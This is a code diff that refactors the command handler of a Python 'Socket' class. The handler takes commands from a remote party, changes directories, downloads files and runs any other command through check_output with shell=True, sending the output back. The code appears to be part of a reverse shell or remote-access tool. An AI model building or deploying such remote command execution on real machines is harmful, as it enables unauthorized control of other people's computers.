@@ -57,32 +57,31 @@ class Socket:
             self.download_file(path)
             return
 
-        else:
-
-            # Change working directory stuff
-            if "cd" in cmd[0:2] and "cd.." not in cmd[0:4]:
-                path = getcwd() + "\\" + cmd[3:]
-                try:
-                    chdir(path)
-                except (FileNotFoundError, OSError) as error:
-                    # self.send_msg(error)
-                    return
-                # self.send_msg(f"Changed directory to {path}")
+        # Change working directory stuff
+        elif "cd" in cmd[0:2] and "cd.." not in cmd[0:4]:
+            path = getcwd() + "\\" + cmd[3:]
+            try:
+                chdir(path)
+            except (FileNotFoundError, OSError) as error:
+                # self.send_msg(error)
                 return
+            # self.send_msg(f"Changed directory to {path}")
+            return
 
-            elif "cd.." in cmd[0:4]:
-                chdir(self.get_parent_path(getcwd()))
-                path = f"Changed directory to {getcwd()}"
-                # self.send_msg(path)
+        elif "cd.." in cmd[0:4]:
+            chdir(self.get_parent_path(getcwd()))
+            path = f"Changed directory to {getcwd()}"
+            # self.send_msg(path)
 
-            # Normal cmd command stuff
+        # Normal cmd command stuff
+        else:
             try:
                 output = check_output(cmd, shell=True)
                 output = ''.join(chr(i) for i in output)
             except CalledProcessError as error:
                 output = error
             self.send_msg(output)
-            return
+        return
 
     def send_msg(self, msg, download=False):
         if download:
